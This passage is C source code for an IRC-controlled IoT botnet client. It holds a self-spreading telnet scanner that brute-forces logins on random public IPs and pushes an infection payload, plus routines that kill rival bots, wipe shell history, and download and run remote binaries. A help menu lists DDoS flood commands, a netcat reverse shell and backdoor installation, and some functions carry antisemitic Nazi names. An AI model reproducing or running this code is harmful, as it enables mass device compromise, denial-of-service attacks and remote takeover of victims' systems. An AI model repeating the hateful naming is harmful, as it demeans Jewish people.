                    } else if(res == -1)
                    {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd, &myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
                    if(res != 0)
                    {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}

char *hold(int sock, char *sender, int argc, char **argv) {
    if(argc < 3 || atoi(argv[3]) < 0) {
        Send(sock, "NOTICE %s :HOLD <ip> <port> <time>\n", sender);
        return;
    }
    if(mfork(sender) != 0) return;
    Send(sock, "NOTICE %s :HOLD flooding %s:%s\n", sender, argv[1], argv[2]);
    sendHOLD(argv[1], atoi(argv[2]), atoi(argv[3]));
}

const char* get_ipstate_host(struct ipstate_t* ipstate)
{
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = ipstate->ip;
    return inet_ntoa(in_addr_ip);
}

int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings)
{
    int num_bytes, i;
    memset(buffer, 0, buf_size);
    num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);

    if(buffer[0] == 0xFF)
    {
        negotiate(fd, buffer, 3);
    }

    if(contains_string(buffer, strings))
    {
        return 1;
    }

    return 0;
}
int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size)
{
    fd_set read_set;
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = timeout_usec;

    FD_ZERO(&read_set);
    FD_SET(fd, &read_set);

    if(select(fd+1, &read_set, NULL, NULL, &tv) < 1)
        return 0;

    return recv(fd, buffer, buf_size, 0);
}
void advance_state(struct ipstate_t* ipstate, int new_state)
{
    if(new_state == 0)
    {
        close(ipstate->fd);
    }

    ipstate->totalTimeout = 0;
    ipstate->state = new_state;
    memset((ipstate->sockbuf), 0, BUFFER_SIZE);
}

void reset_ipstate(struct ipstate_t* ipstate)
{
    advance_state(ipstate, 0);
    ipstate->complete = 1;
}
int contains_success(char* buffer)
{
    return contains_string(buffer, successes);
}
int contains_fail(char* buffer)
{
    return contains_string(buffer, fails);
}
int contains_response(char* buffer)
{
    return contains_success(buffer) || contains_fail(buffer);
}
int contains_string(char* buffer, char** strings)
{
    int num_strings = 0, i = 0;

    for(num_strings = 0; strings[++num_strings] != 0; );

    for(i = 0; i < num_strings; i++)
    {
        if(strcasestr(buffer, strings[i]))
        {
            return 1;
        }
    }

    return 0;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
    struct sockaddr_in dest_addr;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;

    int valopt;
    long arg = fcntl(fd, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(fd, F_SETFL, arg);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if(getHost(host, &dest_addr.sin_addr)) return 0;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

    if(res < 0) {
        if(errno == EINPROGRESS) {
            tv.tv_sec = timeout;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(fd, &myset);
            if(select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                lon = sizeof(int);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                if(valopt) return 0;
            }
            else return 0;
        }
        else return 0;
    }

    arg = fcntl(fd, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(fd, F_SETFL, arg);

    return 1;
}

int negotiate(int sock, unsigned char *buf, int len)
{
    unsigned char c;

    switch (buf[1]) {
    case CMD_IAC: /*dropped an extra 0xFF wh00ps*/
        return 0;
    case CMD_WILL:
    case CMD_WONT:
    case CMD_DO:
    case CMD_DONT:
        c = CMD_IAC;
        send(sock, &c, 1, MSG_NOSIGNAL);
        if(CMD_WONT == buf[1]) c = CMD_DONT;
        else if(CMD_DONT == buf[1]) c = CMD_WONT;
        else if(OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
        else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
        send(sock, &c, 1, MSG_NOSIGNAL);
        send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
        break;

    default:
        break;
    }

    return 0;
}

int matchPrompt(char *bufStr)
{
    char *prompts = ":>%$#\0";

    int bufLen = strlen(bufStr);
    int i, q = 0;
    for(i = 0; i < strlen(prompts); i++)
    {
        while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
        if(*(bufStr + bufLen - q) == prompts[i]) return 1;
    }

    return 0;
}

int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex)
{
    int bufferUsed = initialIndex, got = 0, found = 0;
    fd_set myset;
    struct timeval tv;
    tv.tv_sec = timeout;
    tv.tv_usec = timeoutusec;
    unsigned char *initialRead = NULL;

    while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
    {
        FD_ZERO(&myset);
        FD_SET(fd, &myset);
        if(select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
        initialRead = buffer + bufferUsed;
        got = recv(fd, initialRead, 1, 0);
        if(got == -1 || got == 0) return 0;
        bufferUsed += got;
        if(*initialRead == 0xFF)
        {
            got = recv(fd, initialRead + 1, 2, 0);
            if(got == -1 || got == 0) return 0;
            bufferUsed += got;
            if(!negotiate(fd, initialRead, 3)) return 0;
        } else {
            if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) {
                found = 1;
                break;
            }
        }
    }

    if(found) return 1;
    return 0;
}



static uint8_t ipState[5] = {0};

int sclose(int fd)
{
    if(3 > fd) return 1;
    close(fd);
    return 0;
}

void BurnTheJews(int wait_usec, int maxfds, int sock) {// Freaky scanner by Freak. pulls tonneesss
        if(!fork()) return;
        srand((time(NULL) ^ getpid()) + getppid());
        init_rand(time(NULL) ^ getpid());
        int shell;
        int max = getdtablesize() - 100, i, res, num_tmps, j;
        char buf[128], cur_dir;

        if (max > maxfds)
                max = maxfds;
        fd_set fdset;
        struct timeval tv;
        socklen_t lon;
        int valopt;

        char line[256];
        char* buffer;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        buffer = malloc(SOCKBUF_SIZE + 1);
        memset(buffer, 0, SOCKBUF_SIZE + 1);

        struct ipstate_t fds[max];


        memset(fds, 0, max * (sizeof(int) + 1));
        for(i = 0; i < max; i++)
        {
                memset(&(fds[i]), 0, sizeof(struct ipstate_t));
                fds[i].complete = 1;
                fds[i].sockbuf = buffer;
        }

        while(1)
        {
                for(i = 0; i < max; i++)
                {
                        if(fds[i].totalTimeout == 0)
                        {
                                fds[i].totalTimeout = time(NULL);
                        }

                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        if(fds[i].complete == 1)
                                        {
                                                // clear the current fd
                                                char *tmp = fds[i].sockbuf;
                                                memset(&(fds[i]), 0, sizeof(struct ipstate_t));
                                                fds[i].sockbuf = tmp;
                                                // get a new random ip
                                                fds[i].ip = getRandomPublicIP();
                                        }
                                        else if(fds[i].complete == 0)
                                        {
                                                
                                                
                                                if(fds[i].usernameInd >= NUMITEMS(usernames) -1)
                                                {
                                                        fds[i].complete = 1;
                                                        continue;
                                                }
                                                fds[i].usernameInd++;
                                                fds[i].passwordInd++;
                                                
/*
                                                if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *))
                                                {
                                                        fds[i].passwordInd = 0;
                                                        fds[i].usernameInd++;
                                                }
                                                if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *))
                                                {
                                                        fds[i].complete = 1;
                                                        continue;
                                                }
                                                */
                                        }
                                        dest_addr.sin_family = AF_INET;
                                        dest_addr.sin_port = htons(23);
                                        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                                        dest_addr.sin_addr.s_addr = fds[i].ip;

                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);

                                        if(fds[i].fd == -1) continue;

                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);

                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
                                        {
                                                reset_ipstate(&fds[i]);
                                        }
                                        else
                                        {
                                                advance_state(&fds[i], 1);
                                        }
                                }
                                break;

																case 1:
																	{
																		FD_ZERO(&fdset);
																		FD_SET(fds[i].fd, &fdset);
																		tv.tv_sec = 0;
																		tv.tv_usec = wait_usec;
																		res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
													
																		if(res == 1)
																		{
																			lon = sizeof(int);
																			valopt = 0;
																			getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
																			//printf("%d\n",valopt);
																			if(valopt)
																			{
																				reset_ipstate(&fds[i]);
																			}
																			else
																			{
																				fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
																				advance_state(&fds[i], 2);
																			}
																			continue;
																		}
																		else if(res == -1)
																		{
																			reset_ipstate(&fds[i]);
																			continue;
																		}
													
																		if(fds[i].totalTimeout + 6 < time(NULL))
																		{
																			reset_ipstate(&fds[i]);
																		}
																	}
																	break;
													
																case 2:
																	{
																		//Send(sock, "PRIVMSG %s :[TELNET] DISCOVERED - %s\n", chan, get_ipstate_host(&fds[i]));
																		if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
																		{
																			if(contains_fail(fds[i].sockbuf))
																			{
																				advance_state(&fds[i], 0);
																			}
																			else
																			{
																				advance_state(&fds[i], 3);
																			}
													
																			continue;
																		}
													
																		if(fds[i].totalTimeout + 6 < time(NULL))
																		{
																			reset_ipstate(&fds[i]);
																		}
																	}
																	break;
													
																case 3:
																	{
																		if(send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0)
																		{
																			reset_ipstate(&fds[i]);
																			continue;
																		}
													
																		if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
																		{
																			reset_ipstate(&fds[i]);
																			continue;
																		}
													                    
																		advance_state(&fds[i], 4);
																	}
																	break;
													
																case 4:
																	{
																		if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
																		{
																			if(contains_fail(fds[i].sockbuf))
																			{
																				advance_state(&fds[i], 0);
																			}
																			else
																			{
																				advance_state(&fds[i], 5);
																			}
																			continue;
																		}
													
																		if(fds[i].totalTimeout + 6 < time(NULL))
																		{
																			reset_ipstate(&fds[i]);
																		}
																	}
																	break;
													
																case 5:
																	{
																		//Send(sock, "PRIVMSG %s :[TELNET] ATTEMPT - %s:23 %s:%s\n", chan, get_ipstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
																		if(send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0)
																		{
																			reset_ipstate(&fds[i]);
																			continue;
																		}
													
																		if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
																		{
																			reset_ipstate(&fds[i]);
																			continue;
																		}
													                    
																		advance_state(&fds[i], 6);
																	}
																	break;
													
																case 6:
																	{
																		if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2))
																		{
																			fds[i].totalTimeout = 0;
													
																			if(contains_fail(fds[i].sockbuf))
																			{
																				advance_state(&fds[i], 0);
																			}
																			else if(contains_success(fds[i].sockbuf))
																			{
																				if(fds[i].complete == 2)
																				{
																					advance_state(&fds[i], 7);
																				}
																				else
																				{
												                                    Send(sock, "PRIVMSG %s :[TELNET] CRACKED - %s:23 %s:%s\n", chan, get_ipstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                                                                    advance_state(&fds[i], 7);
																				}
																			}
																			else
																			{
																				reset_ipstate(&fds[i]);
																			}
																			continue;
																		}
													
																		if(fds[i].totalTimeout + 7 < time(NULL))
																		{
																			reset_ipstate(&fds[i]);
																		}
																	}
																	break;							
																case 7:
																	{
																		fds[i].totalTimeout = 0;
                                                                        //get shell just in case we dont have it already
                                                                        for(shell = 0; shell < NUMITEMS(shellz); shell++) {
                                                                            memset(buf, 0, 128);
                                                                            snprintf(buf, 2 + strlen(shellz[shell]), "%s\r\n", shellz[shell]);
                                                                            if(send(fds[i].fd, buf, strlen(shellz[shell]), MSG_NOSIGNAL) < 0) {
																				reset_ipstate(&fds[i]);
																				continue;
																			}
                                                                        }
                                                                        
																		for(j = 0; j < num_tmps; j++)
																		{
																			memset(buf, 0, 128);
																			if(j == 0)
																				snprintf(buf, 58 + (strlen(tmpdirs[j]) * 4), ">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve\r\n", tmpdirs[j], tmpdirs[j], tmpdirs[j], tmpdirs[j]);
																			else
																				snprintf(buf, 24 + strlen(tmpdirs[j]), ">%s.t && cd %s ; >retrieve\r\n", tmpdirs[j], tmpdirs[j], tmpdirs[j]);
													
																			if(send(fds[i].fd, buf, strlen(buf), MSG_NOSIGNAL) < 0)
																			{
																				reset_ipstate(&fds[i]);
																				continue;
																			}
																		}
																		advance_state(&fds[i], 8);
																	}
                                  break;
                                  case 8:
								  {
                                      fds[i].totalTimeout = 0;
                              
                                      if(send(fds[i].fd, rekdevice, strlen(rekdevice), MSG_NOSIGNAL) < 0)
                                      {
                                          Send(sock, "PRIVMSG %s :[TELNET] INFECTED - %s:23 %s:%s\n", chan, get_ipstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                          reset_ipstate(&fds[i]);
                                          continue;
                                      }
                                      if(fds[i].totalTimeout + 10 < time(NULL))
                                      {
                                        Send(sock, "PRIVMSG %s :[TELNET] FAILED TO INFECT - %s:23 %s:%s\n", chan, get_ipstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                        reset_ipstate(&fds[i]);
                                      }  
                                      break;
                                }
                        }
                }
        }				
}		



void SeigHeil(int sock) {
        uint32_t parent;
        parent = fork();
        int forks = sysconf(_SC_NPROCESSORS_ONLN) * 1; //1 fork for each scanner for each cpu
        int fds = forks * 64; //Quite effective. 64 sockets for each CPU fork. - Freak
        int waitms = 370; //Timeout is 370 milliseconds
        if(parent > 0) {
            scanPid = parent;
            return;
        }
        else if(parent == -1) return;
        int ii;
        for(ii = 0; ii < forks; ii++) {
            BurnTheJews(waitms, fds, sock);
         }
         return;
}

void doScanner(int sock, char *sender, int argc, char **argv) {
    if(argc < 1) {
        Send(sock, "NOTICE %s :SCANNER <ON/OFF>\n", sender);
        return;
    }
    if(!strcmp(argv[1], "ON") || !strcmp(argv[1], "on")) {
        if(scanPid == 0) {
            SeigHeil(sock);
            if(scanPid != 0) {
                Send(sock, "PRIVMSG %s :[TELNET] [+] SCANNER STARTED!\n", chan); //Scanner has been started successfully!!!
                return;
            } else {
                Send(sock, "PRIVMSG %s :[TELNET] [-] FAILED TO START SCANNER!\n", chan); //fuk ;-;
                return;
            }
        } else {
            Send(sock, "PRIVMSG %s :[TELNET] [+] SCANNER ALREADY STARTED!\n", chan);
            return;
        }
    }
    if(!strcmp(argv[1], "OFF") || !strcmp(argv[1], "off")) {
        if(scanPid != 0) {
            if(kill(scanPid, 9) == 0) {
                Send(sock, "PRIVMSG %s :[TELNET] [+] SCANNER KILLED!\n", chan);
                scanPid = 0;
                return;
            } else {
                Send(sock, "PRIVMSG %s :[TELNET] [-] FAILED TO KILL SCANNER!\n", chan);
                return;
            }
        } else {
            Send(sock, "PRIVMSG %s :[TELNET] [+] SCANNER NOT STARTED!\n", chan);
            return;
        }
    } else {
        Send(sock, "NOTICE %s :SCANNER <ON/OFF>\n", sender);
        return;
    }
}

void botkill() {
    int i;
    if(!fork()) return;
    while(1) {
        for (i = 0; i < NUMITEMS(knownBots); i++) {
            char command[512];
            sprintf(command, "pkill -9 %s || busybox pkill -9 %s || /usr/busybox pkill -9 %s || /bin/busybox pkill -9 %s || /var/run/busybox pkill -9 %s", knownBots[i], knownBots[i], knownBots[i], knownBots[i], knownBots[i]);
            system(command);
			sleep(1);
        }
    } 
}

void ClearHistory() {
    system ("history -c;history -w");
    system ("cd /root;rm -f .bash_history");
    system ("cd /var/tmp; rm -f *");
}

void dns2ip(int sock, char *sender, int argc, char **argv) {
    if(mfork(sender) != 0) return;
    if(argc == 1) {
        char ip[16];
        strncpy(ip, inet_ntoa( *((struct in_addr*) gethostbyname(argv[1])->h_addr_list[0])), 16 );
        Send(sock, "NOTICE %s :%s resolves to %s\n", sender, argv[1], ip);
    } else {
        Send(sock, "NOTICE %s :DNS2IP <domain>\n", sender);
    }
    exit(0);
}

void update(int sock, char *sender, int argc, char **argv) {
    int sock2,i,d;
    struct sockaddr_in server;
    unsigned long ipaddr;
    unsigned char dgcc;
    char buf[1024], *file;
    FILE *gcc;
    int parent=getpid();
    if(mfork(sender) != 0) return;
    if(argc < 2) {
        Send(sock, "NOTICE %s :UPDATEHTTP <host> <src:bin>\n", sender);
        exit(0);
    }
    if((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        Send(sock, "NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\n", sender);
        exit(0);
    }
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    if((ipaddr = inet_addr(argv[1])) == -1) {
        struct hostent *hostm;
        if((hostm=gethostbyname(argv[1])) == NULL) {
            Send(sock, "NOTICE %s :Unable to resolve address.\n", sender);
            exit(0);
        }
        memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
    }
    else server.sin_addr.s_addr = ipaddr;
    memset(&(server.sin_zero), 0, 8);
    if(connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
        Send(sock, "NOTICE %s :Unable to connect to http.\n", sender);
        exit(0);
    }

    gcc=popen("gcc --help","r");
    if(gcc != NULL) {
        memset(buf,0,1024);
        fgets(buf,1024,gcc);
        if(!strstr(buf,"Usage")) dgcc=0;
        else dgcc=1;
        pclose(gcc);
    } else dgcc=0;

    for (i=0;i<strlen(argv[2]) && argv[2][i] != ':';i++);
    argv[2][i]=0;
    if(dgcc) file=argv[2];
    else file=argv[2]+i+1;
    
    Send(sock2,"GET /%s HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",file,argv[1]);
    Send(sock, "NOTICE %s :Receiving update.\n", sender);
    system("mkdir /tmp");
    if(dgcc) {
        FILE *file=fopen("/tmp/.c","wb");
        char bufm[4096];
        while(1) {
            int i;
            if((i=recv(sock2,bufm,4096,0)) <= 0) break;
            if(i < 4096) bufm[i]=0;
            for (d=0;d<i;d++) if(!strncmp(bufm+d,"\r\n\r\n",4)) {
                for (d+=4;d<i;d++) fputc(bufm[d],file);
                goto done;
            }
        }
        done:
        while(1) {
            int i;
            if((i=recv(sock2,bufm,4096,0)) <= 0) break;
            if(i < 4096) bufm[i]=0;
            for (d=0;d<i;d++) fputc(bufm[d],file);
        }
        fclose(file);
        memset(buf,0,4096);
        sprintf(buf,"(gcc -o %s /tmp/.c; rm -f /tmp/.c; kill -9 %d; %s &) > /dev/null 2>&1",execfile,parent,execfile);
    }
    else {
        FILE *file=fopen("/tmp/.o","wb");
        unsigned char bufm[4096];
        while(1) {
            int i;
            if((i=recv(sock2,bufm,4096,0)) <= 0) break;
            if(i < 4096) bufm[i]=0;
            for (d=0;d<i;d++) if(!strncmp(bufm+d,"\r\n\r\n",4)) {
                for (d+=4;d<i;d++) fputc(bufm[d],file);
                goto done2;
            }
        }
        done2:
        while(1) {
            int i,d;
            if((i=recv(sock2,bufm,4096,0)) <= 0) break;
            if(i < 4096) bufm[i]=0;
            for (d=0;d<i;d++) fputc(bufm[d],file);
        }
        fclose(file);
        memset(buf,0,4096);
        //sprintf(buf,"(chmod 755 /tmp/.o;kill -9 %d; kill -9 %d;trap '' 1 2; /tmp/.o &) > /dev/null",actualparent,parent,execfile);
        //sprintf(buf,"chmod +x /tmp/.o; trap '' 1;sh -c '/var/bin/killall knight*;/var/bin/killall .o;sleep 5;trap \"\" 1;/tmp/.o '&");
        sprintf(buf,"export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/var/bin;chmod +x /tmp/.o; trap '' 1;sh -c '/var/bin/killall knight*;/var/bin/killall kt*;/var/bin/killall .o;/var/bin/sleep 5;trap "" 1;/tmp/.o '&");
    }
    close(sock);
    close(sock2);
    system(buf);
    kill(9,0);
    exit(0);
}


void move(int sock, char *sender, int argc, char **argv) {
        if(argc < 1) {
                Send(sock, "NOTICE %s :MOVE <server>\n", sender);
                exit(1);
        }
    server=strdup(argv[1]);
    changeservers=1;
    close(sock);
}

void hackpkg(int sock, char *sender, int argc, char **argv) {
        int sock2,i,d;
        struct sockaddr_in server;
        unsigned long ipaddr;
        char buf[1024];
        FILE *file;
        mkdir("/var/bin", 0775);
        unsigned char bufm[4096];
        if(mfork(sender) != 0) return;
        if(argc < 2) {
                Send(sock, "NOTICE %s :HACKPGK <url> <binary name>\n", sender);
                exit(0);
        }
        if((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                Send(sock, "NOTICE %s :Unable to create socket.\n", sender);
                exit(0);
        }
        if(!strncmp(argv[1],"http://",7)) strcpy(buf,argv[1]+7);
        else strcpy(buf,argv[1]);
        for (i=0;i<strlen(buf) && buf[i] != '/';i++);
        buf[i]=0;
        server.sin_family = AF_INET;
        server.sin_port = htons(80);
        if((ipaddr = inet_addr(buf)) == -1) {
                struct hostent *hostm;
                if((hostm=gethostbyname(buf)) == NULL) {
                        Send(sock, "NOTICE %s :Unable to resolve address.\n", sender);
                        exit(0);
                }
                memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
        }
        else server.sin_addr.s_addr = ipaddr;
        memset(&(server.sin_zero), 0, 8);
        if(connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
                Send(sock, "NOTICE %s :Unable to connect to http.\n", sender);
                exit(0);
        }

        Send(sock2,"GET /%s HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: HackZilla/1.67 [en] (X11; U; Linux 2.2.16-3 x64)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",buf+i+1,buf);
        Send(sock, "NOTICE %s :Receiving file.\n", sender);
        file=fopen(argv[2],"wb");
        while(1) {
                int i;
                if((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if(i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) if(!strncmp(bufm+d,"\r\n\r\n",4)) {
                        for (d+=4;d<i;d++) fputc(bufm[d],file);
                        goto done;
                }
        }
        done:
        Send(sock, "NOTICE %s :Installed %s to hack path.\n", sender,argv[2]);
        while(1) {
                int i,d;
                if((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if(i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) fputc(bufm[d],file);
        }
        fclose(file);
        close(sock2);
    char MoveIt[255];
    sprintf(MoveIt, "cat %s > /var/bin/%s",argv[2],argv[2]);
    system(MoveIt);
    char DeleteIt[255];
    sprintf(DeleteIt, "rm -f %s", argv[2]);
    system(DeleteIt);
    char String[255];
    sprintf(String, "chmod 775 /var/bin/%s",argv[2]);
    system(String);
    char String2[255];
    sprintf(String2, "ls -l /var/bin/%s",argv[2]);
    system(String2);
        exit(0);
}

void help(int sock, char *sender, int argc, char **argv) {
        if(mfork(sender) != 0) return;
        Send(sock, "NOTICE %s :Non-root/non-spoof DDoS commands commands:\n", sender); sleep(3);
        Send(sock, "NOTICE %s :    STD <ip> <port> <time> = A non spoof HIV STD flooder\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    HOLD <host> <port> <time> = A vanilla TCP connect flooder\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    JUNK <host> <port> <time> = A vanilla TCP flooder (modded)\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs> = An advanced non spoof UDP flooder modified by Freak\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    HTTP <method> <target> <port> <path> <time> <power> = An extremely powerful HTTP flooder\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    WGETFLOOD <url> <secs> = An HTTP(S) flooder\n", sender); sleep(1);
        Send(sock, "NOTICE %s :Spoof/root commands:\n", sender); sleep(3);
        Send(sock, "NOTICE %s :    UDP <target> <port> <secs> = A UDP flooder\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    PAN <target> <port> <secs> = An advanced syn flooder that will kill most network drivers\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    TCP <target> <port> <time> <flags> <packetsize> <pollinterval> <threads> = An advanced TCP flooder with multithreading. Will kill almost any service.\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    PHATWONK <target> <flags/method> <secs> = A leet flooder coded by Freak, attacks 31 ports. Can set flags or attack method.\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    BLACKNURSE <target ip> <secs> = An ICMP packet flooder that will crash most firewalls and use loads of CPU.\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    SOCKSTRESS <ip>:<port> <interface> -s <time> [-p payload] [-d delay]\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> = A NTP DrDoS flooder. Very potent.\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    DNS <IP> <port> <reflection file url> <threads> <time> = A DNS DrDoS flooder. Almost unblockable.\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =   SNMP DrDoS flooder. Insane amp factor (600 - 1700x)\n", sender); sleep(1);
        Send(sock, "NOTICE %s :Other commands:\n", sender); sleep(3);
        Send(sock, "NOTICE %s :    RNDNICK = Randomizes the knights nick\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    NICK <nick> = Changes the nick of the client\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    SERVER <server> = Changes servers\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    GETSPOOFS = Gets the current spoofing\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    SPOOFS <subnet> = Changes spoofing to a subnet\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    DISABLE = Disables all packeting from this client\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    ENABLE = Enables all packeting from this client\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    KILL = Kills the knight\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    DNS2IP <domain>\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    GET <http address> <save as> = Downloads a file off the web and saves it onto the hd\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    UPDATE <http address> <src:bin> = Update this bot\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    HACKPKG <http address> <bin name> = HackPkg is here! Install a bin, using http, no depends!\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    VERSION = Requests version of client\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    KILLALL = Kills all current packeting\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    HELP = Displays this\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    IRC <command> = Sends this command to the server\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    SH <command> = Executes a command\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    ISH <command> = SH, interactive, sends to channel\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    SHD <command> = Executes a psuedo-daemonized command\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    GETBB <tftp server> = Get a proper busybox\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    INSTALL  <http server/file_name> = Download & install a binary to /var/bin \n", sender); sleep(1);
        Send(sock, "NOTICE %s :    BASH <cmd> = Execute commands using bash. \n", sender); sleep(1);
        Send(sock, "NOTICE %s :    BINUPDATE <http:server/package> = Update a binary in /var/bin via wget \n", sender); sleep(1);
        Send(sock, "NOTICE %s :    SCAN <nmap options> = Call the nmap wrapper script and scan with your opts. \n", sender); sleep(1);
        Send(sock, "NOTICE %s :    RSHELL <server> <port> = Equates to nohup nc ip port -e /bin/sh\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    LOCKUP <http:server> = Kill telnet, d/l aes backdoor from <server>, run that instead.\n", sender); sleep(1);
        Send(sock, "NOTICE %s :    GETSSH <http:server/dropbearmulti> = D/l, install, configure and start dropbear on port 30022.\n", sender); sleep(1);
        exit(0);
}
void killall(int sock, char *sender, int argc, char **argv) {
        unsigned long i;
        for (i=0;i<numpids;i++) {
                if(pids[i] != 0 && pids[i] != getpid()) {
